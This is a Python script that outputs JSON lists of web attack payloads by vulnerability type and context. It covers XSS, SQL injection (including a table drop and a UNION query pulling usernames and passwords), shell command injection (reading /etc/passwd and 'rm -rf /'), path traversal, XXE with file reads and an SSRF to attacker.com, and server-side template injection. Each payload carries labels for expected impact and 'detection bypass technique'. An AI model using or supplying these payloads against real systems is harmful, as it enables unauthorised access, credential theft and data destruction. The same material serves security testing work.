import json
import sys

def generate_payloads(vuln_type, context):
    payloads = []
    
    if vuln_type == "xss":
        if context == "html":
            payloads = [
                {
                    "payload": "<script>alert('XSS')</script>",
                    "description": "Basic script tag injection",
                    "expected_impact": "JavaScript execution in browser",
                    "detection_bypass_technique": "Direct injection"
                },
                {
                    "payload": "<img src=x onerror=alert('XSS')>",
                    "description": "Image tag with onerror event",
                    "expected_impact": "JavaScript execution via event handler",
                    "detection_bypass_technique": "Event handler injection"
                },
                {
                    "payload": "javascript:alert('XSS')",
                    "description": "JavaScript protocol injection",
                    "expected_impact": "JavaScript execution in href/src attributes",
                    "detection_bypass_technique": "Protocol handler abuse"
                }
            ]
        elif context == "url":
            payloads = [
                {
                    "payload": "%3Cscript%3Ealert('XSS')%3C/script%3E",
                    "description": "URL encoded script tag",
                    "expected_impact": "JavaScript execution after URL decoding",
                    "detection_bypass_technique": "URL encoding"
                },
                {
                    "payload": "%22%3E%3Cscript%3Ealert('XSS')%3C/script%3E",
                    "description": "Attribute escape with script injection",
                    "expected_impact": "Break out of attribute context",
                    "detection_bypass_technique": "Context breaking"
                }
            ]
        elif context == "json":
            payloads = [
                {
                    "payload": "\"><script>alert('XSS')</script>",
                    "description": "JSON string escape to script",
                    "expected_impact": "JavaScript execution if JSON rendered in HTML",
                    "detection_bypass_technique": "JSON context escape"
                }
            ]
    
    elif vuln_type == "sqli":
        if context == "html":
            payloads = [
                {
                    "payload": "' OR '1'='1",
                    "description": "Classic SQL injection bypass",
                    "expected_impact": "Authentication bypass or data extraction",
                    "detection_bypass_technique": "Boolean logic manipulation"
                },
                {
                    "payload": "'; DROP TABLE users; --",
                    "description": "SQL injection with table drop",
                    "expected_impact": "Data destruction",
                    "detection_bypass_technique": "Statement termination"
                },
                {
                    "payload": "1' UNION SELECT 1,username,password FROM users--",
                    "description": "Union-based data extraction",
                    "expected_impact": "Unauthorized data access",
                    "detection_bypass_technique": "Union query injection"
                }
            ]
        elif context == "url":
            payloads = [
                {
                    "payload": "%27%20OR%20%271%27%3D%271",
                    "description": "URL encoded SQL injection",
                    "expected_impact": "Authentication bypass",
                    "detection_bypass_technique": "URL encoding obfuscation"
                }
            ]
    
    elif vuln_type == "cmd_injection":
        if context == "shell":
            payloads = [
                {
                    "payload": "; cat /etc/passwd",
                    "description": "Command chaining to read passwd file",
                    "expected_impact": "System file disclosure",
                    "detection_bypass_technique": "Command separator"
                },
                {
                    "payload": "| whoami",
                    "description": "Pipe to execute whoami command",
                    "expected_impact": "User enumeration",
                    "detection_bypass_technique": "Pipe operator"
                },
                {
                    "payload": "&& rm -rf /",
                    "description": "Conditional execution of destructive command",
                    "expected_impact": "System destruction",
                    "detection_bypass_technique": "Logical AND operator"
                }
            ]
    
    elif vuln_type == "path_traversal":
        payloads = [
            {
                "payload": "../../../etc/passwd",
                "description": "Directory traversal to access passwd file",
                "expected_impact": "Unauthorized file access",
                "detection_bypass_technique": "Relative path manipulation"
            },
            {
                "payload": "....//....//....//etc/passwd",
                "description": "Double encoding path traversal",
                "expected_impact": "Bypass basic filters",
                "detection_bypass_technique": "Double slash encoding"
            },
            {
                "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "description": "URL encoded path traversal",
                "expected_impact": "Bypass URL filtering",
                "detection_bypass_technique": "URL encoding"
            }
        ]
    
    elif vuln_type == "xxe":
        if context == "xml":
            payloads = [
                {
                    "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
                    "description": "External entity injection to read files",
                    "expected_impact": "Local file disclosure",
                    "detection_bypass_technique": "External entity definition"
                },
                {
                    "payload": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'http://attacker.com/'>]><root>&test;</root>",
                    "description": "External entity for SSRF",
                    "expected_impact": "Server-side request forgery",
                    "detection_bypass_technique": "Remote entity reference"
                }
            ]
    
    elif vuln_type == "ssti":
        payloads = [
            {
                "payload": "{{7*7}}",
                "description": "Basic template injection test",
                "expected_impact": "Server-side code execution",
                "detection_bypass_technique": "Expression evaluation"
            },
            {
                "payload": "{{config.items()}}",
                "description": "Configuration disclosure via template",
                "expected_impact": "Information disclosure",
                "detection_bypass_technique": "Object method access"
            },
            {
                "payload": "{{''.__class__.__mro__[2].__subclasses__()}}",
                "description": "Python object introspection",
                "expected_impact": "Code execution via object access",
                "detection_bypass_technique": "Magic method traversal"
            }
        ]
    
    return payloads

# Read input
lines = []
for line in sys.stdin:
    lines.append(line.strip())

vuln_type = lines[0]
context = lines[1]

# Generate payloads
payloads = generate_payloads(vuln_type, context)

# Output JSON
print(json.dumps(payloads, indent=2))